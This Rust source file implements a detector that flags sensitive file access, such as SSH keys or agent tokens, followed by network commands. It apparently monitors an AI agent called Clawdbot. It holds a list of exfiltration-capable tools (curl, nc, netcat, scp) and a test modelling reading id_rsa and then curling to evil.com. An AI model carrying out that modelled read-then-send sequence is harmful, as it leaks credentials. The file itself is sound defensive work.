//! Temporal sequence detection for exfil patterns.
//! Tracks: sensitive access → network command sequences.

use std::collections::VecDeque;
use std::time::{Duration, Instant};

use crate::sensitive::is_sensitive_path;

/// Network commands that could be used for exfiltration
pub const NETWORK_COMMANDS: &[&str] = &[
    "curl", "wget", "scp", "rsync", "nc", "ncat", "netcat",
    "ssh", "sftp", "ftp",
    "gog", "himalaya", "wacli", "bird",  // Clawdbot-specific
    "sendmail", "mail",
];

/// Check if a command is a network command
pub fn is_network_command(cmd: &str) -> bool {
    NETWORK_COMMANDS.contains(&cmd)
}

/// Alert generated when suspicious sequence detected
#[derive(Debug, Clone)]
pub struct SequenceAlert {
    pub network_command: String,
    pub accessed_files: Vec<String>,
    pub time_gap_secs: u64,
}

/// Tracks temporal sequences of sensitive file access followed by network commands.
pub struct SequenceDetector {
    /// Recent sensitive file accesses: (path, timestamp)
    sensitive_accesses: VecDeque<(String, Instant)>,
    /// TTL for sensitive access memory
    ttl: Duration,
    /// Max entries to keep
    max_entries: usize,
}

impl Default for SequenceDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SequenceDetector {
    /// Create a new sequence detector with default settings (5 minute window)
    pub fn new() -> Self {
        Self {
            sensitive_accesses: VecDeque::new(),
            ttl: Duration::from_secs(300), // 5 minutes
            max_entries: 100,
        }
    }

    /// Create with custom TTL
    pub fn with_ttl(ttl: Duration) -> Self {
        Self {
            sensitive_accesses: VecDeque::new(),
            ttl,
            max_entries: 100,
        }
    }

    /// Record a file access if it's sensitive
    /// Returns true if the file was recorded (was sensitive)
    pub fn record_access(&mut self, path: &str) -> bool {
        if !is_sensitive_path(path) {
            return false;
        }
        self.record_sensitive_access(path);
        true
    }

    /// Record a sensitive file access (internal use or when sensitivity already known)
    pub fn record_sensitive_access(&mut self, path: &str) {
        self.prune_stale();
        self.sensitive_accesses.push_back((path.to_string(), Instant::now()));
        if self.sensitive_accesses.len() > self.max_entries {
            self.sensitive_accesses.pop_front();
        }
    }

    /// Check if network command follows recent sensitive access
    /// Returns Some(alert) if suspicious sequence detected
    pub fn check_exfil_sequence(&mut self, network_cmd: &str) -> Option<SequenceAlert> {
        if !is_network_command(network_cmd) {
            return None;
        }
        
        self.prune_stale();
        
        if self.sensitive_accesses.is_empty() {
            return None;
        }

        let now = Instant::now();
        let oldest = self.sensitive_accesses.front()
            .map(|(_, ts)| now.duration_since(*ts).as_secs())
            .unwrap_or(0);

        let accessed_files: Vec<String> = self.sensitive_accesses
            .iter()
            .map(|(p, _)| p.clone())
            .collect();

        Some(SequenceAlert {
            network_command: network_cmd.to_string(),
            accessed_files,
            time_gap_secs: oldest,
        })
    }

    /// Check command execution - records sensitive accesses and checks for sequences
    /// Returns Some(alert) if the command is a network command following sensitive access
    pub fn check_exec(&mut self, comm: &str, argv: &[String]) -> Option<SequenceAlert> {
        // First check if any argv contains sensitive paths (cat, less, etc.)
        for arg in argv.iter().skip(1) {  // Skip command name
            self.record_access(arg);
        }

        // Then check if this is a network command
        self.check_exfil_sequence(comm)
    }

    /// Remove entries older than TTL
    fn prune_stale(&mut self) {
        let cutoff = Instant::now() - self.ttl;
        while let Some((_, ts)) = self.sensitive_accesses.front() {
            if *ts < cutoff {
                self.sensitive_accesses.pop_front();
            } else {
                break;
            }
        }
    }

    /// Get current sensitive access count (for testing/debugging)
    pub fn access_count(&self) -> usize {
        self.sensitive_accesses.len()
    }

    /// Clear all recorded accesses
    pub fn clear(&mut self) {
        self.sensitive_accesses.clear();
    }

    /// For testing: set max entries
    #[cfg(test)]
    pub fn set_max_entries(&mut self, max: usize) {
        self.max_entries = max;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::thread;

    #[test]
    fn test_empty_sequence_no_alert() {
        let mut seq = SequenceDetector::new();
        assert!(seq.check_exfil_sequence("curl").is_none());
    }

    #[test]
    fn test_sensitive_then_network_alerts() {
        let mut seq = SequenceDetector::new();
        seq.record_sensitive_access("/home/user/.ssh/id_rsa");
        let alert = seq.check_exfil_sequence("curl");
        assert!(alert.is_some());
        assert!(alert.unwrap().accessed_files.contains(&"/home/user/.ssh/id_rsa".to_string()));
    }

    #[test]
    fn test_ttl_expiry() {
        let mut seq = SequenceDetector::with_ttl(Duration::from_millis(10));
        seq.record_sensitive_access("/home/user/.ssh/id_rsa");
        thread::sleep(Duration::from_millis(20));
        assert!(seq.check_exfil_sequence("curl").is_none());
    }

    #[test]
    fn test_multiple_sensitive_files() {
        let mut seq = SequenceDetector::new();
        seq.record_sensitive_access("/home/user/.ssh/id_rsa");
        seq.record_sensitive_access("/home/user/clawd/MEMORY.md");
        let alert = seq.check_exfil_sequence("gog");
        assert!(alert.is_some());
        let files = alert.unwrap().accessed_files;
        assert_eq!(files.len(), 2);
    }

    #[test]
    fn test_max_entries_limit() {
        let mut seq = SequenceDetector::new();
        seq.set_max_entries(5);
        for i in 0..10 {
            seq.record_sensitive_access(&format!("/home/user/.ssh/key{}", i));
        }
        assert!(seq.access_count() <= 5);
    }

    #[test]
    fn test_is_network_command() {
        assert!(is_network_command("curl"));
        assert!(is_network_command("wget"));
        assert!(is_network_command("gog"));
        assert!(is_network_command("himalaya"));
        assert!(is_network_command("wacli"));
        assert!(is_network_command("bird"));
        assert!(!is_network_command("ls"));
        assert!(!is_network_command("cat"));
    }

    #[test]
    fn test_record_access_filters_non_sensitive() {
        let mut seq = SequenceDetector::new();
        let recorded = seq.record_access("/usr/bin/ls");
        assert!(!recorded);
        assert_eq!(seq.access_count(), 0);
    }

    #[test]
    fn test_record_access_accepts_sensitive() {
        let mut seq = SequenceDetector::new();
        let recorded = seq.record_access("/home/user/.ssh/id_rsa");
        assert!(recorded);
        assert_eq!(seq.access_count(), 1);
    }

    #[test]
    fn test_check_exec_records_sensitive_args() {
        let mut seq = SequenceDetector::new();
        // cat reads SSH key - no alert (cat is not network command)
        let alert = seq.check_exec("cat", &["cat".to_string(), "/home/user/.ssh/id_rsa".to_string()]);
        assert!(alert.is_none());
        assert_eq!(seq.access_count(), 1);
    }

    #[test]
    fn test_check_exec_alerts_on_network_after_sensitive() {
        let mut seq = SequenceDetector::new();
        // First: cat reads SSH key
        seq.check_exec("cat", &["cat".to_string(), "/home/user/.ssh/id_rsa".to_string()]);
        // Then: curl sends data out
        let alert = seq.check_exec("curl", &["curl".to_string(), "https://evil.com".to_string()]);
        assert!(alert.is_some());
        let a = alert.unwrap();
        assert_eq!(a.network_command, "curl");
        assert!(a.accessed_files.contains(&"/home/user/.ssh/id_rsa".to_string()));
    }

    #[test]
    fn test_non_network_command_no_alert() {
        let mut seq = SequenceDetector::new();
        seq.record_sensitive_access("/home/user/.ssh/id_rsa");
        // ls is not a network command
        assert!(seq.check_exfil_sequence("ls").is_none());
    }

    #[test]
    fn test_clear_resets_state() {
        let mut seq = SequenceDetector::new();
        seq.record_sensitive_access("/home/user/.ssh/id_rsa");
        assert_eq!(seq.access_count(), 1);
        seq.clear();
        assert_eq!(seq.access_count(), 0);
    }

    #[test]
    fn test_time_gap_calculation() {
        let mut seq = SequenceDetector::new();
        seq.record_sensitive_access("/home/user/.ssh/id_rsa");
        thread::sleep(Duration::from_millis(50));
        let alert = seq.check_exfil_sequence("curl").unwrap();
        // Time gap should be very small (< 1 second)
        assert!(alert.time_gap_secs < 2);
    }

    #[test]
    fn test_clawdbot_specific_commands() {
        let mut seq = SequenceDetector::new();
        seq.record_sensitive_access("/home/user/.clawdbot/tokens.json");
        
        // Test all Clawdbot-specific network tools
        for cmd in &["gog", "himalaya", "wacli", "bird"] {
            let alert = seq.check_exfil_sequence(cmd);
            assert!(alert.is_some(), "{} should be detected as network command", cmd);
        }
    }
}
